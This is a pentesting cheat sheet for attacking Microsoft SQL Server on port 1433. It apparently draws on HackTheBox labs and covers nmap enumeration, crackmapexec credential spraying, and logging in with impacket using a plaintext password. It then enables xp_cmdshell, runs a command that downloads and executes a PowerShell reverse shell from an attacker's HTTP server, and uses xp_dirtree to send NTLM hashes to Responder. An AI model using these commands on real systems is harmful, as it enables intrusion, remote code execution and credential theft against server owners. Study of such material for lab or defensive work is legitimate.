---
title: Port 1433 - MSSQL
draft: false
tags:
  - mssql
  - crackmapexec
  - impacket-mssqlclient
  - cme
---
## Enumeration

```bash
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```

## Bruteforce

Check whether creds found is valid on MSSQL:

``crackmapexec mssql manager.htb -u Desktop/user.txt -p Desktop/user.txt --no-brute --continue-on-success`

## Interaction

Using **impacket-mssqlclient**, interact with the database:

`mssqlclient.py reporting:'PcwTWTHRwryjc$c6'@10.10.10.125 -windows-auth`

![](https://i.imgur.com/bR3FwZc.png)

Below are example interaction:

```sql
SELECT name FROM master.dbo.sysdatabases;
USE master;
select table_name from information_schema.tables;
SELECT COLUMN_NAME, DATA_TYPE, CHARACTER_MAXIMUM_LENGTH, NUMERIC_PRECISION, NUMERIC_SCALE from information_schema.columns where table_name = 'spt_fallback_db';
```



  

## Command Execution

Try **xp_cmdshell** and **xp_dirtree**:
  

```sql
xp_dirtree
xp_cmdshell
EXEC xp_cmdshell
EXEC xp_dirtree
```



  If they are not enabled, try enabling them:

  

```sql
enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

  

### Example CME

If there's **IIS** running and **xp_dirtree** is enabled:

```sql
EXEC xp_dirtree 'C:\inetpub\wwwroot', 1, 1;
```

### Reverse Shell

First check the privilege by typing in `help`:

![](https://i.imgur.com/ADm124T.png)


Enable **xp_cmdshell**:

`enable_xp_cmdshell` & `RECONFIGURE`

![](https://i.imgur.com/zDNomDR.png)


To spawn reverse shell, prepare nishang's **Invoke-PowerShellTcp.ps1** on your attacking directory and start python HTTP server.

Using the command below, download and execute reverse shell script toward your Kali listener:

`EXEC xp_cmdshell 'echo IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.17:8000/ps-rev.ps1") | powershell -noprofile'`

![](https://i.imgur.com/ScVyR6x.png)


Now on your local netcat listener, you have a shell:

![](https://i.imgur.com/NaBRupU.png)


## Relay Attack

Follow [this guide](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#steal-netntlm-hash-relay-attack) on Hacktricks.

First start Responder:

`sudo responder -I tun0`

![](https://i.imgur.com/7mAQptg.png)


Now on MSSQL connection, make a request to Kali's responder:

`xp_dirtree '\\10.10.14.17\home\yoon`

![](https://i.imgur.com/3e75O33.png)



Instantly, reponsder captures NTLM hash:

![](https://i.imgur.com/OCuWc95.png)


On [Hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server), there's more detailed guide on pentesting MSSQL.
